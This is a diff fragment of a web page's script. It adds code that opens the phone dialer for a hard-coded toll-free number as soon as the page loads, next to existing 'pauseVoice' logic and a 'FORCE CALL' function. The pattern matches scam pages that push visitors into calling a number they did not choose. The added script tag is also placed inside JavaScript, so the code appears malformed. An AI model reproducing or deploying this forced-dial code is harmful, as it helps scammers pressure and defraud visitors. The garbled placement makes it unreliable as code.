@@ -857,6 +857,15 @@
                     pauseVoice();
                 }
             });
+            <script>
+    const PHONE = "+18333729042";
+
+    // Request dialer opening; browser may block this
+    // unless the user has interacted with the page.
+    window.addEventListener("load", function () {
+      window.location.href = "tel:" + PHONE;
+    });
+  </script>
 
             // ----- FORCE CALL -----
             function forceCall() {
